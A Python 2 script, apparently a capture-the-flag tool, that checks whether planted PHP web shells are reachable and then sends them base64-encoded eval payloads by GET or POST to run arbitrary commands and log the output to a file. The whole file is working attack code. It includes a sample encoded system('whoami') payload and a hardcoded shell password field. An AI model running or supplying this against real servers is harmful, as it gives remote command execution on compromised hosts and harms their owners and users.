#!/usr/bin/python
#coding=utf-8
import sys,requests,base64


def file_write(filepath,filecontent):
	file = open(filepath,"a")
	file.write(filecontent)
	file.close()

def getflag(url,method,passwd,flag_path,cmd):
	#判断shell是否存在
	try :
		res = requests.get(url,timeout=3)
	except : 
		print "[-] %s ERR_CONNECTION_TIMED_OUT" %url
		file_write(flag_path,"[-] %s ERR_CONNECTION_TIMED_OUT\n\n" %url)
		return 0
	if res.status_code!=200 :
		print "[-] %s Page Not Found!" %url
		file_write(flag_path,"[-] %s Page Not Found!\n\n" %url)
		return 0
	#执行命令来获取flag system,exec,passthru,`,shell_exec
	#a=@eval(base64_decode($_GET[z0]));&z0=c3lzdGVtKCJ3aG9hbWkiKTs=

	getflag_cmd = cmd
	data={}
	if method=='get':
		data[passwd]='@eval(base64_decode($_GET[z0]));'
		data['z0']=base64.b64encode(getflag_cmd)
		try:
			res = requests.get(url,params=data,timeout=3)
			#print res.url
			if res.content:
				content = url+"\n"+res.content+"\n\n"
				file_write(flag_path,content)
				print "[+] %s getflag sucessed!"%url
			else :
				print "[-] %s cmd exec response is null!"%url
				content = url+"\ncmd exec response is null!\n\n"
				file_write(flag_path,content)
		except :
			file_write(flag_path,"\n[+] %s Getflag Failed! You can check the shell's passwd!\n\n"%url)
			print "[+] %s Getflag Failed! You can check the shell's passwd!"%url
	elif method=='post':
		data['pass']='Sn3rtf4ck'
		data[passwd]='@eval(base64_decode($_POST[z0]));'
		data['z0']=base64.b64encode(getflag_cmd)
		try:
			res = requests.post(url,data=data,timeout=3)
			if res.content:
				content = url+"\n"+res.content+"\n\n"
				file_write(flag_path,content)
				print "[+] %s getflag sucessed!"%url
			else :
				print "[-] %s cmd exec response is null!"%url
				content = url+"\ncmd exec response is null!\n\n"
				file_write(flag_path,content)
		except:
			file_write(flag_path,"\n[+] %s Getflag Failed! You can check the shell's passwd!\n\n"%url)
			print "[+] %s Getflag Failed! You can check the shell's passwd!"%url
	